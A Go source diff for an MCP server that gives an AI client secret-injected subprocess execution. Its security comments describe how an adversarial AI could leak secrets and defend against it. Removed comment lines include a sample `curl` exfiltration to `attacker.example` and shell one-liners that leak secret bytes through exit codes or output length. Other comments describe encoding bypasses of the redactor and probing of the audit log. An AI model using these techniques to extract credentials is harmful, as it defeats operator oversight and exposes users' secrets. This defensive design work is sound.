@@ -2,71 +2,33 @@
 //
 // SECURITY MODEL — read before touching this file.
 //
-// The MCP server exposes secrets-aware tools to an AI client. The core
-// invariant of the project (no plaintext secret value ever crosses the
-// AI boundary) is preserved here by *omission*: there is deliberately
-// no `get_secret_value` tool. The absence is the control.
+// The core invariant (no plaintext secret value ever crosses the AI boundary)
+// holds here by omission: there is no get_secret_value tool. The absence IS the
+// control. run_with_secrets lets the AI *use* a secret — it runs a subprocess
+// with secrets injected as env vars and returns redacted stdout/stderr.
 //
-// `run_with_secrets` is the one tool that lets the AI cause a secret to
-// be *used*. It runs an arbitrary subprocess with named secrets injected
-// as environment variables and returns the (redacted) stdout/stderr.
-// Two gaps in that flow are NOT closed by code in this file and cannot
-// be closed by any byte-exact redactor; they are documented here so the
-// next person to touch this file does not "fix" them with a false
-// sense of security:
+// Three channels in that flow cannot be closed by any byte-exact redactor; they
+// are documented so nobody "fixes" them with a false sense of security:
 //
-//  1. SUBPROCESS EXFILTRATION. The AI controls Command and Args. Any
-//     command it picks can move the secret off-box: `curl -H
-//     "X-Leak: $SECRET" attacker.example`, a DNS query whose label
-//     contains the secret, an outbound TCP connection, writing to a
-//     file the AI later reads via another tool, etc. The redactor only
-//     scans stdout/stderr; none of these paths go through stdout.
-//     Output redaction is a guard against the subprocess *accidentally*
-//     echoing the secret, not a sandbox.
+//  1. SUBPROCESS EXFILTRATION. The AI picks the command, so it can move the
+//     secret off-box (network, or a file it reads back via another tool). The
+//     default sandbox blocks the network path; redaction only guards
+//     *accidental* echo to stdout/stderr — it is not a sandbox.
 //
-//  2. ENCODING BYPASS. The redactor now registers each secret in
-//     multiple wire forms (raw, base64 std/URL with and without
-//     padding, lower- and upper-hex — see encodedSecretForms in
-//     redact.go), so a subprocess accidentally emitting the value in
-//     any of those encodings is still caught. NOT covered: URL
-//     percent-encoding (no-op for typical alphanumeric API keys),
-//     JSON-string escaping (no-op for the same), arbitrary ciphers
-//     (rot13, XOR, base32), and entropy-based heuristics (rejected
-//     because false-positive prone on legitimate hashes/UUIDs/tokens).
-//     The high-value common cases are closed; an adversarial AI can
-//     still pick an encoding outside the set, so the file-header
-//     guarantee remains "redaction is a guard against accidental
-//     echo, not a sandbox".
+//  2. ENCODING BYPASS. The redactor registers each secret's raw, base64
+//     (std/URL, ±pad), and hex forms (see encodedSecretForms), so common
+//     accidental re-encodings are caught. Exotic encodings (URL-percent,
+//     base32, custom ciphers) are not — an adversary can always pick one.
 //
-//  3. OUTPUT-VOLUME SIDE CHANNEL. The AI controls the subprocess, so
-//     it can craft a command whose stdout/stderr byte count is a
-//     function of a secret byte (e.g. `printf '%*s' "$X" ""` or a
-//     Python one-liner that emits `ord(secret[0])` characters). The
-//     AI then measures len(stdout) in the returned tool result and
-//     recovers information about the secret. To reduce the channel
-//     rate we quantize each of stdout/stderr to fixed power-of-two
-//     buckets (see outputBuckets / quantizeOutputForAI): every
-//     non-empty stream is padded up to the next bucket boundary
-//     with a clearly-marked tail (`\n[opq-pad]\n` + spaces). That
-//     collapses the previous ~8 bits/call channel (full byte-count
-//     visibility) to ~log2(len(outputBuckets)) bits/call — recovering
-//     one secret byte now requires several calls of carefully crafted
-//     command output rather than one. The channel is reduced, not
-//     eliminated: an adversarial AI can still binary-search bucket
-//     boundaries. Operators concerned about that residual should run
-//     high-risk callers under the policy-enforcing wrapper described
-//     below, or pair this server with rate-limiting at the MCP
-//     transport layer.
+//  3. OUTPUT-VOLUME SIDE CHANNEL. The AI controls output length, so the byte
+//     count leaks secret bits. quantizeOutputForAI pads each stream to fixed
+//     buckets, cutting the rate sharply but not to zero (bucket edges are
+//     still binary-searchable).
 //
-// The supported deployment model for high-risk environments is a
-// policy-enforcing wrapper: a second MCP server that proxies into opq
-// and allowlists (command, args pattern, env var set) tuples for each
-// secret. This file does NOT implement that proxy; it gives the
-// operator a low-trust building block.
-//
-// Resource bounds in this file (timeout, output cap, env-count cap)
-// exist to bound damage from runaway or malicious calls — they do not
-// turn run_with_secrets into a sandbox.
+// For high-risk use the intended model is a policy-enforcing wrapper that
+// allowlists (command, args, secret) tuples; this file is a low-trust building
+// block, not that proxy. The resource bounds below cap blast radius — they do
+// not make run_with_secrets a sandbox.
 package main
 
 import (
@@ -164,28 +126,21 @@ type listSecretsOutput struct {
 }
 
 func handleListSecrets(ctx context.Context, _ *mcp.CallToolRequest, _ listSecretsInput) (*mcp.CallToolResult, listSecretsOutput, error) {
-	// Audit the call BEFORE attempting the backend operation. Mirrors
-	// handleAuditTail (J-5): an AI probing a degraded backend (D-Bus
-	// down, keyring locked, etc.) by hammering list_secrets must still
-	// leave a trace, even when every call returns an error. Previously
-	// the audit fired only on success, so failure-path probing was
-	// invisible to the operator (joint-review 2026-05 P3).
+	// Audit BEFORE the backend call so an AI probing a degraded backend (D-Bus
+	// down, keyring locked) by hammering list_secrets still leaves a trace even
+	// when every call errors.
 	_ = AppendAudit(AuditEvent{Action: ActionList, Caller: callerTag()})
 	backend, err := OpenDefaultBackend()
 	if err != nil {
-		// H1: backend errors may contain keyring/D-Bus text; sanitize.
+		// Sanitize: backend errors may carry keyring/D-Bus text.
 		return aiErr("backend_error"), listSecretsOutput{}, nil
 	}
 	names, err := backend.List(ctx)
 	if err != nil {
-		// H1: backend errors may contain keyring/D-Bus text; sanitize.
 		return aiErr("backend_error"), listSecretsOutput{}, nil
 	}
-	// backend.List returns the raw keyring keyspace, which includes companion
-	// policy items ("meta/<name>"). Those are an internal scheme — the AI must
-	// never see them, and a revoked secret (whose value is wiped but whose
-	// tombstone item survives) must not reappear as a live name. Filter to
-	// real secret keys only.
+	// backend.List returns raw keys including companion "meta/" items; the AI
+	// must never see the scheme or a revoked secret's surviving tombstone.
 	visible := filterVisibleSecretNames(names)
 	return &mcp.CallToolResult{
 		Content: []mcp.Content{&mcp.TextContent{Text: strings.Join(visible, "\n")}},
@@ -203,20 +158,17 @@ type runWithSecretsInput struct {
 	Isolation      string            `json:"isolation,omitempty" jsonschema:"filesystem isolation: 'net' (default; host FS passthrough) or 'full' (tmpfs /home, /tmp; minimal ro-binds)"`
 }
 
-// resolveMCPSandbox maps the (AllowNetwork, Isolation) pair to a
-// SandboxProfile. The default (both unset) is SandboxNet — the AI
-// gets the secret but cannot ship it off-box.
+// resolveMCPSandbox maps (AllowNetwork, Isolation) to a profile. Default is
+// SandboxNet — the AI gets the secret but can't ship it off-box.
 //
 //	AllowNetwork=true  + Isolation=""|"net" -> SandboxNetAllowed (audit network_allowed)
-//	AllowNetwork=true  + Isolation="full"   -> error (incompatible in v1.1)
+//	AllowNetwork=true  + Isolation="full"   -> error (incompatible until v1.2)
 //	AllowNetwork=false + Isolation=""|"net" -> SandboxNet (default)
 //	AllowNetwork=false + Isolation="full"   -> SandboxFull
 //
-// Note: AllowNetwork=true no longer routes to SandboxNone. A previous
-// version did, which let an AI write the resolved secret to /var/tmp
-// during a network-allowed call and read it back from a later
-// SandboxNet call (joint-review 2026-05 P2). SandboxNetAllowed keeps
-// the same FS sandbox as SandboxNet but lifts the netns restriction.
+// allow_network keeps the FS sandbox (SandboxNetAllowed, not SandboxNone) and
+// only lifts the netns; otherwise the AI could write the secret to a host path
+// and read it back from a later sandboxed call.
 func resolveMCPSandbox(allowNetwork bool, isolation string) (SandboxProfile, error) {
 	iso := isolation
 	if iso == "" {
@@ -239,28 +191,13 @@ func resolveMCPSandbox(allowNetwork bool, isolation string) (SandboxProfile, err
 	return SandboxNet, nil
 }
 
-// runWithSecretsOutput is the structured result handed back to the AI.
-//
-// ExitCode is deliberately normalized to {0,1}: returning the raw 8-bit
-// status would turn it into an oracle the AI could use to leak one byte
-// per call via `exit $(printf '%d' "'${SECRET:0:1}")`. The raw status is
-// recorded in the audit log for the human operator.
-//
-// Note the deliberate ABSENCE of stdout_truncated / stderr_truncated
-// flags. A previous version surfaced them as booleans, but combined
-// with caller-controlled commands they were a clean 1-bit-per-call
-// oracle (the AI emits a volume that is a function of a secret byte
-// and binary-searches the cap threshold). Truncation still happens
-// silently in cappedWriter, and the operator-facing audit log still
-// records `stdout_truncated=true` / `stderr_truncated=true` tokens
-// for diagnostics, but the AI no longer gets a clean flag.
-//
-// Stdout and Stderr are passed through quantizeOutputForAI before
-// landing here, so len(Stdout) and len(Stderr) are bucketed to the
-// outputBuckets ladder. The bucketing reduces — but does not eliminate
-// — the underlying len(stdout) channel (gap #3 in the file header).
-// The padding tail is preceded by an `[opq-pad]` marker so AI tooling
-// can skip it when parsing output.
+// runWithSecretsOutput is the result handed to the AI. Several fields are
+// normalized or omitted to deny oracles the AI could drive with a
+// secret-conditional command (the raw values go to the operator audit only):
+//   - ExitCode is collapsed to {0,1}; the raw 8-bit status is a 1-byte/call oracle.
+//   - no stdout_truncated/stderr_truncated flags — each is a 1-bit volume oracle.
+//   - Stdout/Stderr lengths are bucket-quantized by quantizeOutputForAI (gap #3);
+//     the pad tail is marked [opq-pad] so tooling can strip it.
 type runWithSecretsOutput struct {
 	Succeeded bool   `json:"succeeded"`
 	ExitCode  int    `json:"exit_code"`
@@ -269,10 +206,8 @@ type runWithSecretsOutput struct {
 	TimedOut  bool   `json:"timed_out"`
 }
 
-// normalizeExit collapses a raw subprocess exit code to the (Succeeded,
-// ExitCode) pair exposed to the AI. Raw == 0 means success; anything
-// else (including signal-kills and timeouts mapped to nonzero) becomes
-// 1. This is the entire exit-code oracle defense.
+// normalizeExit collapses the raw exit code to {0,1} — the entire exit-code
+// oracle defense. The raw status reaches the operator audit only.
 func normalizeExit(raw int) (bool, int) {
 	if raw == 0 {
 		return true, 0
@@ -280,10 +215,8 @@ func normalizeExit(raw int) (bool, int) {
 	return false, 1
 }
 
-// clampTimeout resolves the requested per-call timeout. Zero or
-// negative requests fall back to the default; values above the ceiling
-// are clamped down silently rather than rejected, since the AI cannot
-// usefully react to a timeout-too-large error.
+// clampTimeout falls back to the default for non-positive requests and silently
+// caps at the ceiling (a too-large error isn't actionable by the AI).
 func clampTimeout(requestedSeconds int) time.Duration {
 	if requestedSeconds <= 0 {
 		return mcpDefaultTimeout
@@ -295,10 +228,8 @@ func clampTimeout(requestedSeconds int) time.Duration {
 	return d
 }
 
-// clampAuditTailN normalizes the AI's requested tail size. Zero or
-// negative falls back to the default; values above the ceiling are
-// clamped to keep audit_tail from being a wholesale-history enumeration
-// channel.
+// clampAuditTailN caps the requested tail size so audit_tail can't become a
+// wholesale-history enumeration channel.
 func clampAuditTailN(requested int) int {
 	if requested <= 0 {
 		return 20
@@ -311,24 +242,24 @@ func clampAuditTailN(requested int) int {
 
 func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input runWithSecretsInput) (*mcp.CallToolResult, runWithSecretsOutput, error) {
 	if input.Command == "" {
-		// H1: user-controlled input validation — safe to return as-is.
+		// Our own validation message; safe to return verbatim.
 		_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "invalid_input"})
 		return aiUserErr("command is required"), runWithSecretsOutput{}, nil
 	}
 	if len(input.Env) > mcpMaxEnvCount {
-		// H1: user-controlled input validation — safe to return as-is.
+		// Our own validation message; safe to return verbatim.
 		_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "invalid_input"})
 		return aiUserErr(fmt.Sprintf("too many env vars in one call (%d > %d)", len(input.Env), mcpMaxEnvCount)), runWithSecretsOutput{}, nil
 	}
 	if len(input.Args) > mcpMaxArgCount {
-		// H1: user-controlled input validation — safe to return as-is.
+		// Our own validation message; safe to return verbatim.
 		_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "invalid_input"})
 		return aiUserErr(fmt.Sprintf("too many args in one call (%d > %d)", len(input.Args), mcpMaxArgCount)), runWithSecretsOutput{}, nil
 	}
 
 	profile, err := resolveMCPSandbox(input.AllowNetwork, input.Isolation)
 	if err != nil {
-		// H1: validation text is entirely our own literals; safe.
+		// Our own literals; safe to return verbatim.
 		return aiUserErr(err.Error()), runWithSecretsOutput{}, nil
 	}
 
@@ -345,24 +276,17 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 	for _, envName := range envNames {
 		secretName := input.Env[envName]
 		if !validEnvName(envName) {
-			// H1: envName is AI-supplied but we already validated it is a
-			// simple identifier; safe to echo back for diagnostics.
 			_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "invalid_env_name"})
 			return aiUserErr(fmt.Sprintf("invalid env var name %q", envName)), runWithSecretsOutput{}, nil
 		}
 		if isBlockedEnvName(envName) {
-			// M1: refuse to inject a secret value into a loader/interpreter
-			// env var name (PATH, LD_*, BASH_ENV, MAVEN_OPTS, NODE_OPTIONS,
-			// GIT_CONFIG_*, etc.). The envName is AI-supplied; echoing it
-			// for the deny-list diagnostic is safe and actionable.
+			// Refuse to inject into a loader/interpreter var (PATH, LD_*,
+			// BASH_ENV, ...) — that would be arbitrary code execution.
 			_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "env_blocked"})
 			return aiUserErr(fmt.Sprintf("env var %q is on the injected-env deny-list (PATH, LD_*, BASH_ENV, etc. — see env_policy.go)", envName)), runWithSecretsOutput{}, nil
 		}
 		if !validSecretName(secretName) {
-			// Taxonomy-style for MCP. The AI can read its own input back via
-			// the audit log; verbose detail is operator-facing only. Audit
-			// the rejection so an AI probing the shape validator leaves a
-			// trace — the deterrent matches the backend.Get not_found path.
+			// Use a stable taxonomy and audit the validation failure.
 			_ = AppendAudit(AuditEvent{Action: ActionDenied, Caller: callerTag(), Message: "invalid_secret_name"})
 			return aiUserErr("invalid_secret_name"), runWithSecretsOutput{}, nil
 		}
@@ -395,17 +319,13 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 	}
 	if profile != SandboxNone {
 		if err := VerifySandboxAvailable(); err != nil {
-			// H1: may contain bwrap binary path or OS error; sanitize.
+			// Sanitize: may carry the bwrap path or OS error.
 			return aiErr("sandbox_unavailable"), runWithSecretsOutput{}, nil
 		}
 	}
 	execCmd, execArgs, err := WrapCommand(profile, input.Command, input.Args)
 	if err != nil {
-		// H1: WrapCommand may include sandbox binary paths; sanitize. But
-		// distinguish caller-fixable cases (binary missing / not executable)
-		// from infrastructure problems so the AI can act on its own input.
-		// WrapCommand's exec.LookPath wraps ErrNotFound and ErrPermission;
-		// errors.Is sees through the wrap.
+		// Sanitize wrapper errors while preserving caller-fixable taxonomy.
 		if errors.Is(err, exec.ErrNotFound) {
 			_ = AppendAudit(AuditEvent{
 				Action:  ActionDenied,
@@ -432,7 +352,7 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 
 	backend, err := OpenDefaultBackend()
 	if err != nil {
-		// H1: may contain keyring/D-Bus text; sanitize.
+		// Sanitize: may carry keyring/D-Bus text.
 		return aiErr("backend_error"), runWithSecretsOutput{}, nil
 	}
 
@@ -450,20 +370,13 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 	resolvedSecretNames := make([]string, 0, len(envMappings))
 	for _, m := range envMappings {
 		secretName := m.secretName
-		// resolveSecret enforces TTL/revocation before any value is returned
-		// (read-only: it never mutates the keyring). Expired or revoked secrets
-		// are refused here just like a not-found, so the AI can never inject a
-		// lapsed credential and the refusal is audited.
+		// resolveSecret enforces TTL/revocation (read-only) before any value is
+		// returned, so the AI can never inject a lapsed credential.
 		buf, err := resolveSecret(ctx, backend, secretName, time.Now().UTC())
 		if err != nil {
-			// Operator audit keeps the precise taxonomy (secret_revoked /
-			// secret_expired / not_found); the AI gets a single, state-free
-			// token. Collapsing revoked/expired/not_found denies the AI a state
-			// oracle: list_secrets already hides revoked tombstones
-			// (filterVisibleSecretNames), so distinguishing "revoked" or
-			// "expired" from "never existed" here would re-leak exactly the fact
-			// that filter was added to hide. H1: secretName is AI-supplied and
-			// validated, so echoing it back is safe; the backend error is not.
+			// Operator audit keeps the precise reason; the AI gets one
+			// state-free token. Distinguishing revoked/expired/not_found would
+			// re-leak the tombstone existence filterVisibleSecretNames hides.
 			_ = AppendAudit(AuditEvent{Action: ActionDenied, SecretName: secretName, Caller: callerTag(), Message: sanitizePolicyErr(err)})
 			switch {
 			case errors.Is(err, ErrSecretRevoked), errors.Is(err, ErrSecretExpired), errors.Is(err, ErrSecretNotFound):
@@ -476,21 +389,16 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 	}
 
 	childEnv := filterParentEnv(envFromMap()) // empty parent inheritance under MCP
-	// MCP children have no inherited env, so common tools (curl, sh) would
-	// fail to locate themselves or a HOME. Provide safe defaults so the
-	// sandbox doesn't trip on missing PATH/HOME. These are inert under
-	// SandboxFull (bwrap --setenv overrides them) and harmless otherwise.
+	// MCP children inherit no env; give them a minimal PATH/HOME so common
+	// tools don't fail on a missing one. Inert under SandboxFull.
 	childEnv = append(childEnv, "PATH=/usr/bin:/usr/sbin:/bin:/sbin", "HOME=/tmp")
 	for _, r := range bufs {
 		childEnv = append(childEnv, r.envName+"="+string(r.buf.Bytes()))
 	}
 
-	// Output pipeline: subprocess writes -> RedactingWriter -> cappedWriter
-	//   -> bytes.Buffer. The redactor MUST sit upstream of the cap so the
-	// cap clips only already-redacted bytes; otherwise a long
-	// non-secret prefix could fill the buffer, push the secret-bearing
-	// suffix past the cap, and lose only the redacted form. We accept
-	// that the redactor scans bytes the cap will drop (see file header).
+	// Pipeline: subprocess -> RedactingWriter -> cappedWriter -> buffer. The
+	// redactor MUST sit upstream of the cap so the cap only ever clips
+	// already-redacted bytes.
 	var stdoutBuf, stderrBuf bytes.Buffer
 	stdoutCap := newCappedWriter(&stdoutBuf, mcpMaxOutputBytes)
 	stderrCap := newCappedWriter(&stderrBuf, mcpMaxOutputBytes)
@@ -508,12 +416,7 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 	defer cancel()
 
 	if input.AllowNetwork {
-		// SecretNames mirrors the ActionMCPRun entry below so operators
-		// reviewing the audit log can correlate WHICH secrets were live
-		// for this network-allowed call without joining two entries by
-		// timestamp. The Message stays operator-facing (command basename
-		// + arg count); filterAuditLineForAI strips it before exposing
-		// the entry to the AI via audit_tail (joint-review 2026-05 P3).
+		// Include SecretNames so operators can review network-approved use.
 		_ = AppendAudit(AuditEvent{
 			Action:      ActionNetworkAllowed,
 			Caller:      callerTag(),
@@ -560,7 +463,7 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 				SecretNames: resolvedSecretNames,
 				Message:     auditMCPRunMessage(-1, stdoutCap.Truncated(), stderrCap.Truncated(), false, elapsed, sanitizeExecStartErr(runErr)),
 			})
-			// H1: runErr may contain binary paths or OS error text; sanitize.
+			// Sanitize: runErr may carry binary paths / OS error text.
 			return aiErr(sanitizeErrForAI(runErr)), runWithSecretsOutput{}, nil
 		}
 	}
@@ -574,20 +477,9 @@ func handleRunWithSecrets(ctx context.Context, _ *mcp.CallToolRequest, input run
 		normalizedExit = 1
 	}
 
-	// Note: stdoutCap.Truncated() / stderrCap.Truncated() are still
-	// recorded in the operator-visible audit log Message below (useful
-	// for diagnostics) but are deliberately NOT exposed to the AI via
-	// the response struct or the textual header. See the godoc on
-	// runWithSecretsOutput for the side-channel reasoning.
-	//
-	// Output bucketing (gap #3): pad stdout and stderr independently to
-	// the next outputBuckets boundary. After quantizeOutputForAI runs,
-	// len(out.Stdout) and len(out.Stderr) take only one of the discrete
-	// bucket values (or zero), reducing the AI-observable output-volume
-	// channel rate from ~17 bits/call (full 0..262144 visibility) to
-	// ~log2(len(outputBuckets)) bits/call. The padding is plain spaces
-	// preceded by a one-shot `[opq-pad]` marker the AI can use to skip
-	// it when consuming output.
+	// Truncation flags stay in the operator audit (below) but are not exposed
+	// to the AI; quantizeOutputForAI buckets the stream lengths. See the
+	// runWithSecretsOutput godoc for the side-channel reasoning.
 	out := runWithSecretsOutput{
 		Succeeded: succeeded,
 		ExitCode:  normalizedExit,
@@ -786,26 +678,12 @@ func handleAuditTail(_ context.Context, _ *mcp.CallToolRequest, input auditTailI
 	// we still return up to n entries. In the worst case all entries are CLI
 	// entries and we return an empty list — that is correct behaviour.
 	n := clampAuditTailN(input.N)
-	// J-5: record EVERY audit_tail call (caller-tagged "mcp") BEFORE the read,
-	// so an AI scraping the operator's activity is itself visible in the log,
-	// even if the underlying tailAudit call fails. Message carries the
-	// requested-after-clamp size only; no caller-controlled bytes.
-	//
-	// joint-review 2026-05 P3: tag the self-entry with a per-call random
-	// nonce so the strip below can find OUR entry regardless of position.
-	// The previous PID-based match only worked when our self-entry was
-	// the LAST line in the filtered view; a concurrent AppendAudit (or
-	// another audit_tail call from the same PID in a separate goroutine)
-	// could displace it and either (a) leak our bookkeeping into the AI's
-	// window or (b) incorrectly strip the line that is now last. A
-	// crypto/rand-sourced 128-bit nonce is unique-per-call and immune to
-	// reordering, PID reuse, and concurrent writers.
-	//
-	// If crypto/rand fails (extraordinarily unlikely on Linux but
-	// possible in constrained environments) the nonce stays empty and
-	// the strip becomes a no-op for this call — the AI still sees the
-	// self-entry, which is a one-row leak of our own bookkeeping, not a
-	// security violation. We prefer that to crashing the handler.
+	// Record every audit_tail call BEFORE the read, so an AI scraping operator
+	// activity is itself visible even if the read then fails. A per-call random
+	// nonce tags our self-entry so the strip below finds it regardless of
+	// position (a PID match broke under concurrent writers / PID reuse). If
+	// crypto/rand fails the nonce is empty and the strip no-ops — the AI sees
+	// one bookkeeping row, not a security violation; better than crashing.
 	nonce := generateAuditNonce()
 	_ = AppendAudit(AuditEvent{
 		Action:  ActionAuditTail,
@@ -815,7 +693,6 @@ func handleAuditTail(_ context.Context, _ *mcp.CallToolRequest, input auditTailI
 	})
 	lines, err := tailAudit(mcpMaxAuditTailN)
 	if err != nil {
-		// H1: tailAudit error may contain file-system paths; sanitize.
 		return aiErr("internal_error"), auditTailOutput{}, nil
 	}
 
@@ -907,13 +784,8 @@ func stripSelfAuditTailEntry(filtered []string, nonce string) []string {
 // safe to surface to an MCP caller. The original error is preserved for the
 // audit log; only the AI-visible CallToolResult uses the sanitized form.
 //
-// Call context: this helper is reached from handleRunWithSecrets ONLY for
-// process-start failures (cmd.Start errors not matching preflight/sandbox
-// validation and cmd.Wait errors not matching *exec.ExitError or timeout).
-// The fallthrough is therefore exec_start_failed, not a generic catch-all.
-// Backend errors and sandbox-unavailable errors are mapped to fixed strings
-// at their own call sites (see "backend_error" and "sandbox_unavailable"
-// literals in this file).
+// Call context: handleRunWithSecrets uses this only for process-start
+// failures. Backend and sandbox errors are mapped at their own call sites.
 //
 // Taxonomy keys (stable interface — do not change without a version bump):
 //
@@ -960,22 +832,14 @@ func aiUserErr(msg string) *mcp.CallToolResult {
 	}
 }
 
-// filterAuditLineForAI applies two MCP-specific filters to a single raw
-// audit-log JSON line before returning it to an AI caller:
+// filterAuditLineForAI filters one raw audit line before it reaches an AI:
+//   - caller filter: drop anything not caller="mcp", so CLI-driven entries
+//     (get/set/delete, gate failures, operator-chosen sandbox profiles) stay
+//     invisible. The prefix match is future-proof for session IDs ("mcp:abc").
+//   - message allowlist: for key=value-shaped Messages, strip every token not
+//     on aiAuditMessageAllowlist (raw_exit, elapsed_ms, ... are oracles).
 //
-//  1. (M3) caller filter — drops any line whose "caller" field does not have
-//     the prefix "mcp". CLI-driven entries (get/set/delete, redaction_disabled,
-//     gate-failure details, sandbox profiles chosen by the human) are invisible
-//     to the AI. The prefix match is future-proof for session IDs ("mcp:abc").
-//
-//  2. (C1) raw_exit strip — for "mcp_run" entries, removes all space-separated
-//     tokens whose key prefix is "raw_exit" from the "msg" field. This closes
-//     the exit-code oracle: normalizeExit already withholds raw_exit from the
-//     run_with_secrets response, but the AI could read it back via audit_tail
-//     without this strip.
-//
-// Returns ("", false) if the line should be dropped entirely.
-// Returns (filtered, true) with raw_exit stripped if the line should be included.
+// Returns ("", false) to drop the line entirely.
 func filterAuditLineForAI(line string) (string, bool) {
 	// Fast path: skip obviously empty lines.
 	if strings.TrimSpace(line) == "" {
@@ -989,25 +853,17 @@ func filterAuditLineForAI(line string) (string, bool) {
 		return "", false
 	}
 
-	// M3: only MCP-originated entries are visible to the AI.
+	// Only MCP-originated (caller="mcp") entries are visible to the AI.
 	if !strings.HasPrefix(ev.Caller, "mcp") {
 		return "", false
 	}
 
-	// C1/J-10: filter Message fields that use the operator-facing
-	// `key=value` shape down to a small AI-safe allowlist. The gate
-	// must cover EVERY action whose Message uses that shape; today
-	// those are ActionMCPRun (raw_exit / elapsed_ms / *_truncated /
-	// timed_out), ActionNetworkAllowed (command / args), and ActionSet
-	// (expires_at). ActionSet is CLI-only today so the M3 caller filter
-	// already drops it before this gate runs; it is listed anyway so the
-	// key=value `expires_at` token would still be stripped if a future MCP
-	// set path ever emitted it under an "mcp" caller. Bare-token
-	// taxonomy actions (ActionDenied with "env_blocked",
-	// "invalid_input", etc.) intentionally bypass this filter because
-	// the allowlist's bare-token rule would drop their entire payload.
-	// audit_tail's "n=<int>" Message is also AI-supplied so leaving it
-	// through is a no-op in security terms.
+	// The allowlist gate must cover EVERY action whose Message uses the
+	// key=value shape: ActionMCPRun, ActionNetworkAllowed, and ActionSet
+	// (expires_at). ActionSet is CLI-only today and dropped by the caller
+	// filter above, but is listed so a future MCP set path can't leak it.
+	// Bare-token actions (ActionDenied: env_blocked, ...) deliberately bypass
+	// the gate — the allowlist would drop their whole payload.
 	switch ev.Action {
 	case ActionMCPRun, ActionNetworkAllowed, ActionSet:
 		if ev.Message != "" {
